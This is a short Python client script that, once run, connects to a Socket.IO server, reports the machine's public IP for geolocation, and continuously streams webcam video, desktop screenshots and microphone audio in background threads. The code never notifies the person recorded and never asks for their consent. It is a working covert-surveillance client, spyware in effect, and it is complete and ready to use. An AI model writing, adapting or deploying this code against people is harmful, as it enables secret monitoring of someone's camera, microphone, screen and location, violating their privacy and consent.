import cv2
import pyautogui
import base64
import socketio
import numpy as np
import threading
import time
import pyaudio
import requests

# --- CONFIG ---
SERVER_URL = 'http://localhost:5000'  # Change to your server's LAN IP if needed

# Socket.IO client
sio = socketio.Client()

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return '0.0.0.0'

def encode_frame(frame):
    _, buf = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY),40])
    return base64.b64encode(buf).decode('utf-8')

def send_webcam():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Webcam not accessible")
        return
    while True:
        _, frame = cap.read()
        small = cv2.resize(frame,(320,240))
        sio.emit('video_frame', encode_frame(small))
        time.sleep(0.1)

def send_screen():
    while True:
        img = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
        small = cv2.resize(frame,(640,360))
        sio.emit('screen_frame', encode_frame(small))
        time.sleep(1)

def send_audio():
    CH, FR, CHUNK = 1, 44100, 1024
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16,
                    channels=CH,
                    rate=FR,
                    input=True,
                    frames_per_buffer=CHUNK)
    while True:
        try:
            data = stream.read(CHUNK, exception_on_overflow=False)
            sio.emit('audio_data', base64.b64encode(data).decode('utf-8'))
        except Exception as e:
            print("Audio error:", e)

def main():
    sio.connect(SERVER_URL)
    # send client IP for geolocation
    sio.emit('client_info', {'ip': get_public_ip()})

    for fn in (send_webcam, send_screen, send_audio):
        t = threading.Thread(target=fn, daemon=True)
        t.start()

    while True:
        time.sleep(1)

if __name__ == '__main__':
    main()
